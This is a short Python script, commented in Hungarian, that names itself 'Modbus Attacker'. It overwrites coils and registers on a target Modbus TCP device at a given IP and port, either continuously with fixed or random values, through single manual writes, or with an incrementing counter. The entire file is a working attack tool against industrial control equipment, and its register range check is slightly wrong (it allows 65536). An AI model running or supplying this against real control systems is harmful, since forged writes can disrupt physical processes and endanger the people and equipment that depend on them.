import sys,json,time
from pyModbusTCP.client import ModbusClient
import random

def cont_func(target_type,target_IP,target_Port,value=-1): #fix idokozonkent ugyanarra a cimre kuld
    Target=ModbusClient(target_IP,target_Port)
    print("celcim:")
    address=int(input())
    print("idozites mp-ben:")
    timing=float(input())
    if value==-1:#random ertek mod
        if target_type=="coil":
            while True:
                n=random.randint(0,1)
                Target.open()
                Target.write_single_coil(address,n)
                Target.close()
                time.sleep(timing)
                print("random ertek: "+str(n)+" elkuldve "+str(address)+" cimre")
        elif target_type=="register":
            while True:
                n=random.randint(0,2**16)
                Target.open()
                Target.write_single_register(address,n)
                Target.close()
                time.sleep(timing)
                print("random ertek: "+str(n)+" elkuldve "+str(address)+" cimre")
    else:#fix ertek mod
        if target_type=="coil":
            while True:
                Target.open()
                Target.write_single_coil(address,int(value))
                Target.close()
                time.sleep(timing)
                print("fix ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
        elif target_type=="register":
            while True:
                Target.open()
                Target.write_single_register(address,int(value))
                Target.close()
                time.sleep(timing)
                print("fix ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
    

def single_func(target_type,target_IP,target_Port):
    Target=ModbusClient(target_IP,target_Port)
    print("celcim:")
    address=int(input())  
    if target_type=="coil":
        while True:
            print("ertek, valid 0 es 1:")
            value=int(input())
            Target.open()
            Target.write_single_coil(address,value)
            Target.close()
            print("ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
    elif target_type=="register":
        while True:
            print("ertek, valid 0 es 65536 kozott:")
            value=int(input())
            Target.open()
            Target.write_single_register(address,value)
            Target.close()
            print("ertek: "+str(value)+" elkuldve "+str(address)+" cimre")


def counter_func(target_IP,target_Port):
    Target=ModbusClient(target_IP,target_Port)
    print("celcim:")
    address=int(input())
    print("max ertek ameddig menjen:")
    maxvalue=int(input())
    print("idozites mp-ben:")
    timing=float(input())
    for x in range(0, maxvalue+1):
        Target.open()
        Target.write_single_register(address,x)
        Target.close()
        print("novekvo ertek: "+str(x)+" elkuldve "+str(address)+" cimre")
        time.sleep(timing)



#sys.argv bemenet: target.ip target.port 
print("Modbus Attacker elindult")
target_IP=sys.argv[1]
target_Port=int(sys.argv[2])
#target=ModbusClient(target_IP,target_Port)

print("continous: folyamatosan kuldi az uzeneteket egy celcimre")#ebbol van fix ertekes es random
print("single: egy uzenetet kuld egy cimre")#egy fix erteket egyszer elkuld, ujra kerdezi mit kuldjon
print("counter: a megadott celig novekvo erteku uzeneteket kuld, csak egy registerre van ertelmezve")
mode=str(input()) 
print("coil: coilt(1 db bit) fog atirni, igaz-hamis ertekekben")
print("register: registert(16 bit) fog atirni 0tol 65536ig")
target_type=input()


if mode=="continous":
    print("fix: ugyanazt az erteket kuldi")
    print("random: veletlenszeru erteket kuld az uzenetben")
    submode=input()   
    if submode=="fix":
        print("ertek:")
        value=input()
        cont_func(target_type,target_IP,target_Port,value)#ezen belul kerdezi a coil/reg celcimet
    elif submode=="random":
        cont_func(target_type,target_IP,target_Port)
elif mode=="single":
    print()
    single_func(target_type,target_IP,target_Port)
elif mode=="counter":#nem is ellenorizzuk hogy mi a target type mert csak register lehet
    print()
    counter_func(target_IP,target_Port)

#random.randint(0,2**16) registerre
#random.randint(0,1) boolra 
